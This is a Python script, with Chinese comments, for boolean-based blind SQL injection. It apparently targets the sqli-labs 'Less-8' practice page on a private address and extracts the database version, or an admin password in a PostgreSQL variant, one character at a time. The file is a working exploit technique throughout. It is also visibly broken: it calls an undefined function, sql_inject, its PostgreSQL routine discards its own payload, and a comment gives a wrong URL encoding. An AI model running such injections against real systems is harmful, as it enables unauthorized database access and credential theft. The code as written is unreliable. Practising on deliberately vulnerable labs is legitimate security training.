# -*-coding:utf-8 -*-
# 测试mysql注入的布尔盲注脚本
import requests
# 非常规的请自己进行生成，默认使用该payload
# and ascii(substr((select version()),1,1)) = 52
# and if(ascii(substr((select version()),1,1))=52,1,0)
# select case when(ascii(substr((select version()), 1, 1)) = 58) then 1 else 0 end;



def mysql_inject(payload,index):
    suzz_flag= "You are in..........."
    for i in range(32, 128):
        # 注意单双引号注入的类型和以及payload的方式
        # 注意对字符串进行编码,# 转换为 %23，单引号转换为 %23
        vuln_url="http://192.168.233.140/Less-8/?id=1%27and%20ascii(substr({},{},1))={}%23".format(payload,index,i)
        vuln_url="http://192.168.233.140/Less-8/?id=1%27and%20if(ascii(substr({},{},1))={},1,0)%23".format(payload,index,i)
        if suzz_flag in requests.get(vuln_url).text:
            return chr(i)


def postgre_inject(payload,index):
    inject = "CASE WHEN (ascii(substr((select password from users where username=$$admin$$),{},1))={}) THEN name ELSE count(q.id)::text END "
    vuln_url = "http://192.168.233.140/Less-8/categories?order="

    vuln_url =vuln_url+inject
    # select 1 from xx where xx =xxx order by case when 

    suzz_flag= "You are in..........."
    for i in range(32, 128):
        # 注意单双引号注入的类型和以及payload的方式
        # 注意对字符串进行编码,# 转换为 %23，单引号转换为 %23
        vuln_url="http://192.168.233.140/Less-8/?id=1%27and%20ascii(substr({},{},1))={}%23".format(payload,index,i)
        vuln_url="http://192.168.233.140/Less-8/?id=1%27and%20if(ascii(substr({},{},1))={},1,0)%23".format(payload,index,i)


        if suzz_flag in requests.get(vuln_url).text:
            return chr(i)




def brute_attack():
    # 注意payload需要使用()进行包裹
    payload = "(select version())"
    #payload = "database()"
    print("Your input is")
    print(payload)

    for index in range(0,50):
        if sql_inject(payload,index):
            print(sql_inject(payload,index),end="")

brute_attack()